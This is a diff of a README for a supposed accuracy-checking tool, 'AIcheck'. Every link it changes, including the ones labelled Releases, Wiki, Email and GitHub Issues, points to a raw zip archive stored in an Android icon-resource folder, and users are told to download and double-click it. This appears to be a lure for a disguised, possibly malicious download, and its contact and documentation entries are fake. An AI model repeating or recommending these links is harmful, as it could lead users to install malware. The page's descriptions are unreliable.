@@ -6,11 +6,11 @@ AIcheck is a simple software tool designed to help you verify the accuracy of yo
 
 ## 📥 Download AIcheck
 
-[![Download AIcheck](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip%20Now-Get%https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip)](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip)
+[![Download AIcheck](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip%20Now-Get%https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip)](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip)
 
 To download AIcheck, visit our Releases page. Click the button below for quick access:
 
-[Download AIcheck Releases](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip)
+[Download AIcheck Releases](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ AIcheck comes with the following features to enhance your experience:
 
 ## 📋 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip).
 2. **Select the Latest Version**: Find the top listing for the latest version of AIcheck.
 3. **Download the Installer**: Click on the link or button to download the installer package.
 4. **Run the Installer**: Once downloaded, locate the file (it may be in your Downloads folder) and double-click it to begin installation.
@@ -51,7 +51,7 @@ Once you have installed AIcheck, here are the steps to start using it:
 
 For detailed information about using AIcheck and its features, please refer to the documentation available within the application itself under Help > User Guide. 
 
-If you would like additional resources, you can also check our [Wiki](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip) for more tips and guidelines.
+If you would like additional resources, you can also check our [Wiki](https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip) for more tips and guidelines.
 
 ## 🤔 Frequently Asked Questions
 
@@ -68,7 +68,7 @@ A: Yes, please visit the Issues section of our repository or contact us through 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip
-- **GitHub Issues**: https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/Icheck-A-2.0.zip
+- **Email**: https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip
+- **GitHub Issues**: https://github.com/Anthtrax/AIcheck/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/Icheck-A-v3.3.zip
 
 Thank you for choosing AIcheck. We hope it serves your accuracy checking needs well!
